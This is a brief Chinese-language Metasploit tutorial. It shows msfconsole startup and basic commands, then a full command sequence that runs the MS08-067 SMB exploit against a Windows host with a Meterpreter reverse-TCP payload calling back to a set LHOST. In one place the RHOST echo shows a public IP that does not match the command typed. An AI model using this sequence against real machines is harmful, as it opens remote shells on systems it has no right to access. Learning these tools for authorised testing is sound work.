001.metasploit使用简介
---

##启动metasploit
```bash
root@kali:~# msfconsole
```

```                                              
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.5-2016010401                   ]
+ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
+ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
```
###基本命令
```bash
msf > help
```

```bash
msf > show
```

```bash
msf > clear
```
###设置选项并攻击
```bash
msf > use exploit/windows/smb/ms08_067_netapi 
```

```
msf exploit(ms08_067_netapi) > show options
```

```
msf exploit(ms08_067_netapi) > set RHOST 192.168.1.3
RHOST => 219.225.51.172
```

```
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

```
msf exploit(ms08_067_netapi) > show options
```

```bash
msf exploit(ms08_067_netapi) > set LHOST 192.168.1.2
LHOST => 192.168.1.2
```

```bash
msf exploit(ms08_067_netapi) > exploit
```
